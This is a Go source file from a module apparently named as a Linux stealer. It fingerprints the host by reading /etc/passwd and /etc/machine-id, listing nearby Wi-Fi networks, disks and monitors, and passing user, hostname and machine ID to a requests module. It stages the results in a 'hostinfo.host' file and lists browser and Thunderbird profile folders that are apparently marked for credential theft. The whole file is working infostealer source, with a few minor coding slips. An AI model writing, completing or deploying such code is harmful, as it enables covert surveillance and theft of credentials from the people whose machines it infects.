package system

import (
	"encoding/json"
	"linux_stlr/utils/requests"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
)

type SystemInfo struct {
	MachineID  string
	Hostname   string
	Users      []string
	User       string
	Monitors   []string
	CPU        map[string]string
	RAM        map[string]string
	Release    map[string]string
	Kernel     string
	Wifi       []WIFI
	FileSystem []FILESYSTEM
}

type WIFI struct {
	InUse    bool
	BSSID    string
	SSID     string
	MODE     string
	CHAN     string
	RATE     string
	SIGNAL   int
	BARS     string
	SECURITY string
}

type FILESYSTEM struct {
	FileSystem string
	Size       string
	Used       string
	Available  string
	MountedOn  string
}

func Run(destinationdir string) {
	var SystemInfo SystemInfo
	SystemInfo.MachineID, _ = GetMachineID()
	SystemInfo.Hostname, _ = os.Hostname()
	SystemInfo.Users, _ = GetUsers()
	SystemInfo.User = GetUser()
	SystemInfo.User = GetUser()
	SystemInfo.CPU = GetCPU()
	SystemInfo.RAM = GetRAM()
	SystemInfo.Release = GetRelease()
	SystemInfo.Kernel = GetKernel()
	SystemInfo.Wifi = GetWifi()
	SystemInfo.FileSystem = GetDisks()
	SystemInfo.Monitors = GetMonitors()

	b, _ := json.MarshalIndent(SystemInfo, "	", "	")
	requests.SetRunTimeInfo(SystemInfo.User, SystemInfo.Hostname, SystemInfo.MachineID, runtime.GOOS)
	os.WriteFile(filepath.Join(destinationdir, "hostinfo.host"), b, os.FileMode(0666))
}

func GetUser() string {
	if os.Getenv("USER") != "" {
		return os.Getenv("USER")
	} else if os.Getenv("USERNAME") != "" {
		return os.Getenv("USERNAME")
	}
	return "unknown"
}

func GetUsers() ([]string, error) {
	var users []string
	contents, err := os.ReadFile("/etc/passwd")
	if err != nil {
		return nil, err
	}
	lines := strings.Split(string(contents), "\n")
	for _, line := range lines {
		fields := strings.Split(line, ":")
		if len(fields) != 7 {
			continue
		}
		if !strings.Contains(fields[6], "nologin") && !strings.Contains(fields[6], "false") && !strings.Contains(fields[6], "sync") {
			users = append(users, fields[5])
		}
	}
	return users, nil
}

func GetMachineID() (string, error) {
	f, err := os.Open("/etc/machine-id")
	if err != nil {
		return "", err
	}
	var machineid = make([]byte, 32)
	_, err = f.Read(machineid)
	if err != nil {
		return "", err
	}
	return string(machineid), nil
}

func GetCPU() map[string]string {
	cmd := exec.Command("lscpu")

	out, err := cmd.Output()
	if err != nil {
		return nil
	}

	var cpuinfo = make(map[string]string)
	lines := strings.Split(string(out), "\n")
	for i := 0; i < len(lines); i++ {
		if strings.Contains(lines[i], "Vendor ID") {
			cpuinfo["VendorID"] = strings.TrimSpace(strings.SplitN(lines[i], ":", 2)[1])
		} else if strings.Contains(lines[i], "Model name") {
			cpuinfo["ModelName"] = strings.TrimSpace(strings.SplitN(lines[i], ":", 2)[1])
		}
	}
	return cpuinfo
}

func GetRAM() map[string]string {
	cmd := exec.Command("cat", "/proc/meminfo")

	out, err := cmd.Output()
	if err != nil {
		return nil
	}
	var raminfo = make(map[string]string)
	lines := strings.Split(string(out), "\n")
	for i := 0; i < len(lines); i++ {
		if strings.HasPrefix(lines[i], "MemTotal:") {
			raminfo["Total"] = strings.TrimSpace(strings.SplitN(lines[i], ":", 2)[1])
		} else if strings.HasPrefix(lines[i], "MemFree:") {
			raminfo["Free"] = strings.TrimSpace(strings.SplitN(lines[i], ":", 2)[1])
		} else if strings.HasPrefix(lines[i], "Active:") {
			raminfo["Used"] = strings.TrimSpace(strings.SplitN(lines[i], ":", 2)[1])
		}
	}
	return raminfo
}

func GetRelease() map[string]string {
	cmd := exec.Command("lsb_release", "-a")

	out, err := cmd.Output()
	if err != nil {
		return nil
	}
	var release = make(map[string]string)
	lines := strings.Split(string(out), "\n")
	for i := 0; i < len(lines); i++ {
		if strings.Contains(lines[i], ":") {
			kv := strings.SplitN(lines[i], ":", 2)
			release[strings.TrimSpace(kv[0])] = strings.TrimSpace(kv[1])
		}
	}
	return release
}

func GetKernel() string {
	cmd := exec.Command("uname", "-r")

	out, err := cmd.Output()
	if err != nil {
		return "Not Found"
	}

	return strings.TrimSpace(string(out))
}

func GetWifi() []WIFI {
	cmd := exec.Command("nmcli", "dev", "wifi")

	out, err := cmd.Output()
	if err != nil {
		return nil
	}
	var wifinetworks []WIFI
	lines := strings.Split(string(out), "\n")
	for i := 0; i < len(lines); i++ {
		if len(strings.TrimSpace(lines[i])) != 0 && i != 0 {
			var wifinetwork WIFI

			if lines[i][0] == '*' {
				wifinetwork.InUse = true
				lines[i] = lines[i][1:]
			}

			tmp := strings.Split(lines[i], "  ")
			var values []string
			for j := 0; j < len(tmp); j++ {
				if strings.TrimSpace(tmp[j]) != "" {
					values = append(values, strings.TrimSpace(tmp[j]))
				}
			}
			wifinetwork.BSSID = values[0]
			wifinetwork.SSID = values[1]
			wifinetwork.MODE = values[2]
			wifinetwork.CHAN = values[3]
			wifinetwork.RATE = values[4]
			wifinetwork.SIGNAL, _ = strconv.Atoi(values[5])
			wifinetwork.BARS = values[6]
			wifinetwork.SECURITY = values[7]
			wifinetworks = append(wifinetworks, wifinetwork)
		}

	}
	return wifinetworks
}

func GetDisks() []FILESYSTEM {
	cmd := exec.Command("df", "-h")

	out, err := cmd.Output()
	if err != nil {
		return nil
	}
	var filesystems []FILESYSTEM
	lines := strings.Split(string(out), "\n")
	for i := 0; i < len(lines); i++ {
		if len(strings.TrimSpace(lines[i])) != 0 && i != 0 {
			if !(strings.HasPrefix(lines[i], "tmpfs") || strings.HasPrefix(lines[i], "Filesystem")) {
				var filesystem FILESYSTEM
				tmp := strings.Split(lines[i], " ")
				var values []string
				for j := 0; j < len(tmp); j++ {
					if strings.TrimSpace(tmp[j]) != "" {
						values = append(values, tmp[j])
					}
				}
				filesystem.FileSystem = values[0]
				filesystem.Size = values[1]
				filesystem.Used = values[2]
				filesystem.Available = values[3]
				filesystem.Used = values[4]
				filesystem.MountedOn = values[5]
				filesystems = append(filesystems, filesystem)
			}
		}
	}
	return filesystems
}

func GetMonitors() []string {
	cmd := exec.Command("xrandr", "--listmonitors")

	out, err := cmd.Output()
	if err != nil {
		return nil
	}
	var monitors []string
	lines := strings.Split(string(out), "\n")
	for i := 0; i < len(lines); i++ {
		if !strings.HasPrefix(lines[i], "Monitors:") && strings.TrimSpace(lines[i]) != "" {
			monitors = append(monitors, strings.TrimSpace(lines[i]))
		}
	}
	return monitors
}

func BrowserPaths() []string {
	return []string{`.mozilla`, `.config`, `snap`, `.waterfox`, `.thunderbird`, `.moonchild productions`, `.librewolf`}
}
